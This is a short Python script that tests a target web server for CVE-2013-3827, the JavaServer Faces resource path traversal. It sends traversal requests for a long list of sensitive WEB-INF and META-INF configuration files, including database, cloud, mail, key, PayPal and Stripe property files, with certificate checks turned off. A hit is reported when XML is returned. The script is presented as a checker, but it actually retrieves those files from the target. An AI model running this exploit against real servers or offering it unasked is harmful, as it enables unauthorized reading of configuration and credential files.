import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url = 'https://your_target.tld'

paths = [
    'WEB-INF/web.xml',
    'WEB-INF/config.xml',
    'WEB-INF/beans.xml',
    'META-INF/context.xml',
    'META-INF/MANIFEST.MF',
    'META-INF/maven/pom.xml',
    'WEB-INF/classes/log4j.properties',
    'WEB-INF/classes/application.properties',
    'WEB-INF/classes/spring/application-config.xml',
    'WEB-INF/classes/hibernate.cfg.xml',
    'WEB-INF/spring-configuration.xml',
    'WEB-INF/classes/META-INF/persistence.xml',
    'WEB-INF/struts-config.xml',
    'WEB-INF/classes/META-INF/orm.xml',
    'WEB-INF/applicationContext.xml',
    'WEB-INF/jboss-web.xml',
    'WEB-INF/jboss-deployment-structure.xml',
    'WEB-INF/classes/jetty-env.xml',
    'WEB-INF/classes/META-INF/ejb-jar.xml',
    'WEB-INF/resin-web.xml',
    'WEB-INF/classes/c3p0.properties',
    'WEB-INF/classes/META-INF/services/javax.enterprise.inject.spi.Extension',
    'WEB-INF/glassfish-web.xml',
    'WEB-INF/sun-web.xml',
    'WEB-INF/classes/rabbitmq.properties',
    'WEB-INF/classes/jdbc.properties',
    'WEB-INF/classes/mongodb.properties',
    'WEB-INF/classes/cassandra.properties',
    'WEB-INF/classes/aws.properties',
    'WEB-INF/classes/azure.properties',
    'WEB-INF/classes/google-cloud.properties',
    'WEB-INF/classes/memcached.properties',
    'WEB-INF/classes/redis.properties',
    'WEB-INF/classes/elasticsearch.properties',
    'WEB-INF/classes/activemq.properties',
    'WEB-INF/classes/mail.properties',
    'WEB-INF/classes/security.properties',
    'WEB-INF/classes/ssl.properties',
    'WEB-INF/classes/keys.properties',
    'WEB-INF/classes/paypal.properties',
    'WEB-INF/classes/stripe.properties'
]

headers = {
    'Host': 'your_target.tld',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'Connection': 'close',
}

prefix = '/javax.faces.resource.../'

for path in paths:
    for suffix in ['', '.jsf']:
        full_path = prefix + path + suffix
        try:
            response = requests.get(url + full_path, headers=headers, verify=False)

            if '<?xml' in response.text:
                print(f"! The target may be vulnerable to CVE-2013-3827 at {full_path}")
            else:
                print(f"The target is likely not vulnerable to CVE-2013-3827 at {full_path}")
        except Exception as e:
            print(f"* An error occurred while checking {full_path}: {str(e)}")
